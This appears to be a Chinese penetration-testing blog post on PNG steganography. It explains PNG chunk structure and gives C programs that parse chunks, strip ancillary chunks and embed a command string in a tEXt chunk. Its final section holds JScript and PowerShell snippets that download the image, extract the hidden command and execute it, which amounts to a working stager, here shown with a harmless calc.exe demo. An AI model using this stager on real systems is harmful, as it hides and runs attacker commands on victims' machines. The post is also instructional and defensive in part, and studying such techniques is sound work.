---
layout: post
title: 隐写技巧——利用PNG文件格式隐藏Payload
---


## 0x00 前言
---
隐写术(Steganography)由来已久，其中有很多好玩儿的细节，所以打算系统的研究一下，这次先从PNG的文件格式开始。
![Alt text](
https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/0.jpg)

> 图片来自于http://null-byte.wonderhowto.com/how-to/guide-steganography-part-1-hide-secret-messages-images-0130797/

## 0x01 简介
---

隐写术可以理解为信息隐藏，在渗透测试中最主要的应用是对Payload的隐藏。本文会对PNG的文件格式进行分析，编写c程序实现自动解析文件格式，并按照其文件格式添加自定义的payload，不仅不会影响图片的正常浏览，同时可将图片上传到网络，使用时将图片下载再以特定格式解密，最终执行payload。

**注：**

所有程序源码已上传github，地址为：
https://github.com/3gstudent/PNG-Steganography

## 0x02 PNG文件格式
---
 
### 1、PNG文件署名域
前8字节

固定格式，16进制为：
`89 50 4e 47 0d 0a 1a 0a `


### 2、数据块

Chunk Type Code(数据块类型码): 4字节,数据块类型码


Chunk Data(数据块数据): 可变长度,存储数据

CRC(循环冗余检测): 4字节,存储用来检测是否有错误的循环冗余码


**数据块类型：**

**1. 关键数据块(critical chunk)**

(1) 文件头数据块IHDR(header chunk)
- 包含PNG文件的基本信息
- 一个PNG数据流中只能有一个IHDR
- **必须在PNG文件最前面**

(2) 调色板数据块PLTE(palette chunk)
- 包含有与索引彩色图像(indexed-color image)相关的彩色变换数据
- **必须在IDAT之前**

(3) 图像数据块IDAT(image data chunk)
- 存储实际的数据
- 可存在多个
- **必须与其他IDAT连续**

(4) 图像结束数据IEND(image trailer chunk)
- 固定格式，16进制为：
`00 00 00 00 49 45 4E 44 AE 42 60 82`
- **必须在PNG文件最尾部**

**2. 辅助数据块(ancillary chunk)**

用于辅助指示PNG图像中的层、文字等信息

**可删除，不影响图片浏览，但图像将失去原来的可编辑性**

(1) 背景颜色数据块bKGD(background color)

(2) 基色和白色度数据块cHRM(primary chromaticities and white point)

(3) 图像γ数据块gAMA(image gamma)

(4) 图像直方图数据块hIST(image histogram)

(5) 物理像素尺寸数据块pHYs(physical pixel dimensions)

(6) 样本有效位数据块sBIT(significant bits)

(7) 文本信息数据块tEXt(textual data)

(8) 图像最后修改时间数据块tIME (image last-modification time)

(9) 图像透明数据块tRNS (transparency)

(10) 压缩文本数据块zTXt (compressed textual data)




## 0x03 实例格式分析
---

工具：`Hex Editor`

**优点：**

可对16进制字符串进行标记，设置颜色，方便格式分析

**测试文件：**

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/test.png)

**源下载地址：**

http://www.easyicon.net/language.en/1172671-png_icon.html

标记好的文件格式如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-1.PNG)

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-2.PNG)



### (1) PNG文件署名域

固定格式：

`89 50 4e 47 0d 0a 1a 0a `


### (2) IHDR


00000008h: 00 00 00 0D 49 48 44 52 00 00 00 1A 00 00 00 1A ; ....IHDR........
00000018h: 08 04 00 00 00 03 43 84 45                      ; ......C凟


**数据块结构：**

**Length:**	
`00 00 00 0D`

前4字节，定义长度，00 00 00 0D十进制为13，代表长度为13个字节

**Chunk Type Code：**		
`49 48 44 52`

4字节，定义数据块类型码，此处为IHDR

**Chunk Data：**
`00 00 00 1A 00 00 00 1A 08 04 00 00 00 `

共13字节，定义数据内容
		
**CRC：**
4字节，对Chunk Type Code+Chunk Data作CRC32计算得出的值

即对以下十六进制作计算：
`49 48 44 52 00 00 00 1A 00 00 00 1A 08 04 00 00 00`

编写程序对CRC算法进行验证，保存为example1.cpp,源代码如下：

```
#include <string.h>
unsigned int GetCrc32(char* InStr,unsigned int len){        
  unsigned int Crc32Table[256];      
  int i,j;        
  unsigned int Crc;        
  for (i = 0; i < 256; i++){        
	Crc = i;        
	for (j = 0; j < 8; j++){        
	  if (Crc & 1)        
		Crc = (Crc >> 1) ^ 0xEDB88320;        
	  else       
		Crc >>= 1;      
	}        
	Crc32Table[i] = Crc;        
  }        
	
  Crc=0xffffffff;        
  for(int m=0; m<len; m++){          
	Crc = (Crc >> 8) ^ Crc32Table[(Crc & 0xFF) ^ InStr[m]];        
  }     
	   
  Crc ^= 0xFFFFFFFF;     
  return Crc;        
}        
int main(int argc, char* argv[])
{
	char buf[17]={0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x1A,0x08,0x04,0x00,0x00,0x00};
	unsigned int crc32=GetCrc32(buf,sizeof(buf));
	printf("%08X\n",crc32);
	return 0;
}
```

运行后如图，输出`03438445`，同文件中的CRC32校验码相同

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-3.png)


### (3) gAMA

00000021h: 00 00 00 04 67 41 4D 41 00 00 B1 8F 0B FC 61 05 ; ....gAMA..睆.黙.

**数据块结构：**

Length:				`00 00 00 04`

Chunk Type Code：	`67 41 4D 41`

Chunk Data：		`00 00 B1 8F`

CRC：				`0B FC 61 05`

### (4) cHRM
00000031h: 00 00 00 20 63 48 52 4D 00 00 7A 26 00 00 80 84 ; ... cHRM..z&..€?
00000041h: 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 ; ..?..€?.u0..阘
00000051h: 00 00 3A 98 00 00 17 70 9C BA 51 3C             ; ..:?..p満Q<

**数据块结构：**

Length:				`00 00 00 20`

Chunk Type Code：	`63 48 52 4D`

Chunk Data：			`00 00 7A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 98 00 00 17 70`

CRC：				`9C BA 51 3C`

### (5) IDAT

(6-14) tEXt

(15)IEND

**数据块结构：**

Length:				`00 00 00 00`

Chunk Type Code：	`49 45 4E 44`

Chunk Data：	

CRC：				`AE 42 60 82`

固定结构，CRC的值为对Chunk Type Code作CRC32校验

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-4.png)



## 0x04 编写程序分析文件格式
---
开发工具：`vc6.0`

### 1、读取PNG文件

保存为example2.cpp，代码如下:

```
#include<stdio.h>
#include<string.h>
int main(int argc, char* argv[])
{
	FILE *fp;   
	if((fp=fopen("c:\\test\\test.png","rb+"))==NULL)
		return 0;   
	fseek(fp,0,SEEK_END);
	int len=ftell(fp);
	unsigned char *buf=new unsigned char[len];	
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("len=%d\n",len);
	for(int i=1;i<=len;i++)
	{
		printf("%02X ",buf[i-1]);
		if(i%16==0)
			printf("\n");
	}
	fclose(fp);
	printf("\n");
	return 0;	
}
```


如图，程序按照UltraEdit的格式输出，以便后续的格式分析

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-5.PNG)



### 2、解析数据块结构

从第8字节开始，读前四字节为ChunkLength

对应的代码为：

```
unsigned int ChunkLen=(buf[0]<<24)|(buf[1]<<16)|(buf[2]<<8)|buf[3];
```

接着四字节为ChunkName

```
printf("ChunkName:%c%c%c%c\n",buf[0],buf[1],buf[2],buf[3]);
```

然后根据ChunkLength读出完整的ChunkData

最后读出CRC32的值,同Chunk Type Code+Chunk Data求出的CRC32校验值作比较


保存为check.cpp,完整代码如下：

```
#include<stdio.h>
#include<string.h>

unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
	unsigned int Crc32Table[256];      
	unsigned int i,j;        
	unsigned int Crc;        
	for (i = 0; i < 256; i++){        
		Crc = i;        
		for (j = 0; j < 8; j++){        
			if (Crc & 1)        
				Crc = (Crc >> 1) ^ 0xEDB88320;        
			else       
				Crc >>= 1;      
		}        
		Crc32Table[i] = Crc;        
	}        
	
	Crc=0xffffffff;        
	for(unsigned int m=0; m<len; m++){          
		Crc = (Crc >> 8) ^ Crc32Table[(Crc & 0xFF) ^ InStr[m]];        
	}     
	
	Crc ^= 0xFFFFFFFF;     
	return Crc;        
}        

int main(int argc, char* argv[])
{
	FILE *fp;   
	unsigned char *buf=NULL;
	unsigned int len=0;
	unsigned int ChunkLen=0;
	unsigned int ChunkCRC32=0;
	unsigned int ChunkOffset=0;	
	unsigned int crc32=0;
	unsigned int i=0;
	if((fp=fopen("c:\\test\\test.png","rb+"))==NULL)
		return 0;   
	fseek(fp,0,SEEK_END);
	len=ftell(fp);
	buf=new unsigned char[len];
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("Total Len=%d\n",len);
	printf("----------------------------------------------------\n");
	fseek(fp,8,SEEK_SET);
	ChunkOffset=8;
	i=0;
	while(1)
	{
		i++;
		memset(buf,0,len);
		fread(buf,4,1,fp);
		ChunkLen=(buf[0]<<24)|(buf[1]<<16)|(buf[2]<<8)|buf[3];
		fread(buf,4+ChunkLen,1,fp);
		printf("[+]ChunkName:%c%c%c%c		",buf[0],buf[1],buf[2],buf[3]);
		if(strncmp((char *)buf,"IHDR",4)==0|strncmp((char *)buf,"PLTE",4)==0|strncmp((char *)buf,"IDAT",4)==0)
			printf("Palette Chunk\n");
		printf("Ancillary Chunk\n");
		printf("   ChunkOffset:0x%08x	\n",ChunkOffset);
		printf("   ChunkLen: %10d		\n",ChunkLen);
		ChunkOffset+=ChunkLen+12;
		crc32=GetCrc32(buf,ChunkLen+4);
		printf("   ExpectCRC32:%08X\n",crc32);
		fread(buf,4,1,fp);
		ChunkCRC32=(buf[0]<<24)|(buf[1]<<16)|(buf[2]<<8)|buf[3];
		printf("   ChunkCRC32: %08X		",ChunkCRC32);
		if(crc32!=ChunkCRC32)
			printf("[!]CRC32Check Error!\n");
		else
			printf("Check Success!\n\n");
		ChunkLen=ftell(fp);
		if(ChunkLen==(len-12))
		{
			printf("\n----------------------------------------------------\n");
			printf("Total Chunk:%d\n",i);		
			break;
		}
	}
	fclose(fp);
	return 0;	
}
```

运行如图，可获得完整的PNG文件结构

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-6.PNG)

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-7.PNG)



**注：**

这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。

后续会补充python的实现代码

## 0x05 去除多余数据
---
上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块

### 1、工具实现

如图，使用`Hex Editor`去除辅助数据块gAMA、cHRM和bKGD

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-8.PNG)

如图，文件大小变化，但不影响PNG文件浏览

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-9.png)


### 2、程序实现

去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png

保存为compress.cpp,完整代码为：

```
#include<stdio.h>
#include<string.h>

unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
	unsigned int Crc32Table[256];      
	unsigned int i,j;        
	unsigned int Crc;        
	for (i = 0; i < 256; i++){        
		Crc = i;        
		for (j = 0; j < 8; j++){        
			if (Crc & 1)        
				Crc = (Crc >> 1) ^ 0xEDB88320;        
			else       
				Crc >>= 1;      
		}        
		Crc32Table[i] = Crc;        
	}        
	
	Crc=0xffffffff;        
	for(unsigned int m=0; m<len; m++){          
		Crc = (Crc >> 8) ^ Crc32Table[(Crc & 0xFF) ^ InStr[m]];        
	}     
	
	Crc ^= 0xFFFFFFFF;     
	return Crc;        
}        

int main(int argc, char* argv[])
{
	FILE *fp,*fpnew;   
	unsigned char *buf=NULL;
	unsigned int len=0;
	unsigned int ChunkLen=0;
	unsigned int ChunkCRC32=0;
	unsigned int ChunkOffset=0;	
	unsigned int crc32=0;
	unsigned int i=0,j=0;
	unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};	
	unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};	   
	
	if((fp=fopen("c:\\test\\0.png","rb+"))==NULL)
		return 0;  
	if((fpnew=fopen("c:\\test\\new.png","wb"))==NULL)
		return 0;  
	fseek(fp,0,SEEK_END);
	len=ftell(fp);
	buf=new unsigned char[len];
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("Total Len=%d\n",len);
	printf("----------------------------------------------------\n");
	fseek(fp,8,SEEK_SET);
	ChunkOffset=8;
	i=0; 
	fwrite(Signature,8,1,fpnew);
	while(1)
	{
		i++;
		j=0;
		memset(buf,0,len);
		fread(buf,4,1,fp);
		fwrite(buf,4,1,fpnew);
		ChunkLen=(buf[0]<<24)|(buf[1]<<16)|(buf[2]<<8)|buf[3];
		fread(buf,4+ChunkLen,1,fp);
		printf("[+]ChunkName:%c%c%c%c		",buf[0],buf[1],buf[2],buf[3]);
		if(strncmp((char *)buf,"IHDR",4)==0|strncmp((char *)buf,"PLTE",4)==0|strncmp((char *)buf,"IDAT",4)==0)
		{	
			printf("Palette Chunk\n");

			fwrite(buf,4+ChunkLen,1,fpnew);
		}
		else
		{
			printf("Ancillary Chunk\n");
			fseek(fpnew,-4,SEEK_CUR);
			j=1;
		}
		printf("   ChunkOffset:0x%08x	\n",ChunkOffset);
		printf("   ChunkLen: %10d		\n",ChunkLen);
		crc32=GetCrc32(buf,ChunkLen+4);
		printf("   ExpectCRC32:%08X\n",crc32);
		fread(buf,4,1,fp);
		ChunkCRC32=(buf[0]<<24)|(buf[1]<<16)|(buf[2]<<8)|buf[3];
		printf("   ChunkCRC32: %08X		",ChunkCRC32);
		if(crc32!=ChunkCRC32)
			printf("[!]CRC32Check Error!\n");
		else
		{
			printf("Check Success!\n\n");
			if(j==0)
				fwrite(buf,4,1,fpnew);
		}
		ChunkLen=ftell(fp);
		if(ChunkLen==(len-12))
		{
			printf("\n----------------------------------------------------\n");
			printf("Total Chunk:%d\n",i);		
			break;
		}
	}
	fwrite(IEND,12,1,fpnew);
	fclose(fp);
	fclose(fpnew);
	return 0;	
}
```

如图，左边为原始PNG文件大小，右边为去掉所有辅助数据块后的文件，仍然可以正常浏览

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-10.png)




## 0x06 写入Payload
---
**实例：**

按照辅助数据块的格式写入Payload

写入的Payload为:

```
calc.exe
```

辅助数据块设置为：

```
tEXt
```

对应的完整数据块结构如下：

```
Length:				00 00 00 08
Chunk Type Code：	74 45 58 74
Chunk Data：			63 61 6c 63 2e 65 78 65
CRC：				fa c4 08 76
```

写入的十六进制数据如下：

```
00 00 00 08 74 45 58 74 63 61 6c 63 2e 65 78 65 fa c4 08 76
```

**注：**
本实例仅作演示，实际使用可换成其他数据块，更加隐蔽


### 1、工具实现

使用`Hex Editor`插入数据，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-11.PNG)

保存后，不影响PNG文件浏览

### 2、程序实现

去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt

保存为addpayload.cpp,完整代码：

```
#include<stdio.h>
#include<string.h>

unsigned int GetCrc32(unsigned char* InStr,unsigned int len){        
	unsigned int Crc32Table[256];      
	unsigned int i,j;        
	unsigned int Crc;        
	for (i = 0; i < 256; i++){        
		Crc = i;        
		for (j = 0; j < 8; j++){        
			if (Crc & 1)        
				Crc = (Crc >> 1) ^ 0xEDB88320;        
			else       
				Crc >>= 1;      
		}        
		Crc32Table[i] = Crc;        
	}        
	
	Crc=0xffffffff;        
	for(unsigned int m=0; m<len; m++){          
		Crc = (Crc >> 8) ^ Crc32Table[(Crc & 0xFF) ^ InStr[m]];        
	}     
	
	Crc ^= 0xFFFFFFFF;     
	return Crc;        
}        

void convertStrToUnChar(char* str, unsigned char* UnChar)  
{  
	int i = strlen(str), j = 0, counter = 0;  
	char c[2];  
	unsigned int bytes[2];  
  
	for (j = 0; j < i; j += 2)   
	{  
		if(0 == j % 2)  
		{  
			c[0] = str[j];  
			c[1] = str[j + 1];  
			sscanf(c, "%02x" , &bytes[0]);  
			UnChar[counter] = bytes[0];  
			counter++;  
		}  
	}  
	return;  
}     

void AddPayload(FILE *fp)
{
	char *Payload="calc.exe";
	unsigned char *buf;
	int len;
	int crc32;
	len=strlen(Payload);	
	buf=new unsigned char[len+12];
	buf[0]=len>>24&0xff;
	buf[1]=len>>16&0xff;
	buf[2]=len>>8&0xff;
	buf[3]=len&0xff;
	buf[4]='t';
	buf[5]='E';
	buf[6]='X';
	buf[7]='t';
	for(int j=0;j<len;j++)
		buf[j+8]=Payload[j];
	buf[len+8]=0XFA;
	buf[len+9]=0XC4;
	buf[len+10]=0X08;
	buf[len+11]=0X76;
	fwrite(buf,len+12,1,fp);
}

int main(int argc, char* argv[])
{
	FILE *fp,*fpnew;   
	unsigned char *buf=NULL;
	unsigned int len=0;
	unsigned int ChunkLen=0;
	unsigned int ChunkCRC32=0;
	unsigned int ChunkOffset=0;	
	unsigned int crc32=0;
	unsigned int i=0,j=0;
	unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};	
	unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};	   
	
	if((fp=fopen("c:\\test\\test.png","rb+"))==NULL)
		return 0;  
	if((fpnew=fopen("c:\\test\\new.png","wb"))==NULL)
		return 0;  
	fseek(fp,0,SEEK_END);
	len=ftell(fp);
	buf=new unsigned char[len];
	fseek(fp,0,SEEK_SET);
	fread(buf,len,1,fp);
	printf("Total Len=%d\n",len);
	printf("----------------------------------------------------\n");
	fseek(fp,8,SEEK_SET);
	ChunkOffset=8;
	i=0; 
	fwrite(Signature,8,1,fpnew);
	while(1)
	{
		i++;
		j=0;
		memset(buf,0,len);
		fread(buf,4,1,fp);
		fwrite(buf,4,1,fpnew);
		ChunkLen=(buf[0]<<24)|(buf[1]<<16)|(buf[2]<<8)|buf[3];
		fread(buf,4+ChunkLen,1,fp);
		printf("[+]ChunkName:%c%c%c%c		",buf[0],buf[1],buf[2],buf[3]);
		if(strncmp((char *)buf,"IHDR",4)==0|strncmp((char *)buf,"PLTE",4)==0|strncmp((char *)buf,"IDAT",4)==0)
		{	
			printf("Palette Chunk\n");

			fwrite(buf,4+ChunkLen,1,fpnew);
		}
		else
		{
			printf("Ancillary Chunk\n");
			fseek(fpnew,-4,SEEK_CUR);
			j=1;
		}
		printf("   ChunkOffset:0x%08x	\n",ChunkOffset);
		printf("   ChunkLen: %10d		\n",ChunkLen);
		crc32=GetCrc32(buf,ChunkLen+4);
		printf("   ExpectCRC32:%08X\n",crc32);
		fread(buf,4,1,fp);
		ChunkCRC32=(buf[0]<<24)|(buf[1]<<16)|(buf[2]<<8)|buf[3];
		printf("   ChunkCRC32: %08X		",ChunkCRC32);
		if(crc32!=ChunkCRC32)
			printf("[!]CRC32Check Error!\n");
		else
		{
			printf("Check Success!\n\n");
			if(j==0)
				fwrite(buf,4,1,fpnew);
		}
		ChunkLen=ftell(fp);
		if(ChunkLen==(len-12))
		{
			printf("\n----------------------------------------------------\n");
			printf("Total Chunk:%d\n",i);		
			break;
		}
	}
	AddPayload(fpnew);
	fwrite(IEND,12,1,fpnew);
	fclose(fp);
	fclose(fpnew);
	return 0;	
}
```

使用check.cpp对其进行校验，如图，校验成功

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-12.PNG)




## 0x07 读取payload并执行
---
将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：

### 1、javascript

```
h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.SetTimeouts(0, 0, 0, 0);
h.Open("GET","https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master//new.png",false);
h.Send();
Data = h.ResponseText;
x=Data.indexOf("tEXt");
y=Data.indexOf("IEND");
str=Data.substring(x+4,y-8);
new ActiveXObject("WScript.Shell").Run(str); 
```


### 2、powershell

```
$url = 'https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png'
$request = New-Object System.Net.WebCLient
$bytes = $request.DownloadString($url)
$x=$bytes.indexof("tEXt")
$y=$bytes.indexof("IEND")
$str=$bytes.Substring($x+4,$y-$x-12)
Start-Process -FilePath $str
```

**注:**

这里给出两种方法，仅作演示

## 0x08 小结
---
本文详细介绍分析了PNG文件的格式，编写程序实现以下功能：

- 自动解析PNG文件格式，辅助查找其中的隐藏内容

- 添加Payload

- 下载PNG图片解析并执行payload



---

[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)


